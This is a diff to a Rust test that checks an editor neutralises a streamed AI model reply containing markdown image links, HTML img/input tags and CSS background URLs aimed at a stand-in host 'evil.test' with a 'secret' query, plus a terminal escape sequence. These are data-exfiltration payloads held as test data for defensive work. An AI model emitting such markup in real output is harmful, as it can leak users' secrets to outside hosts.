@@ -481,8 +481,7 @@ fn a_reply_that_would_make_an_editor_fetch_something_is_cut() {
     if !test_profile::in_isolated_profile() {
         return;
     }
-    let said =
-        "see ![](https://evil.test/?q=secret) <IMG src=\"https://evil.test/\">\r\nnext\u{1b}[2J";
+    let said = "see ![](https://evil.test/?q=secret) <IMG src=\"https://evil.test/\"> <input type=image src=x> <div style=\"background:url(x)\">\r\nnext\u{1b}[2J";
     let reply = format!(
         "data: {}\n\ndata: [DONE]\n\n",
         json!({"choices":[{"delta":{"content": said},"finish_reason":"stop"}]})
@@ -497,7 +496,7 @@ fn a_reply_that_would_make_an_editor_fetch_something_is_cut() {
     assert_eq!(
         editor.texts(),
         [
-            "see ! [](https://evil.test/?q=secret) < IMG src=\"https://evil.test/\">\nnext\u{241b}[2J"
+            "see ! [](https://evil.test/?q=secret) < IMG src=\"https://evil.test/\"> < input type=image src=x> < div style=\"background:url(x)\">\nnext\u{241b}[2J"
         ]
     );
 }
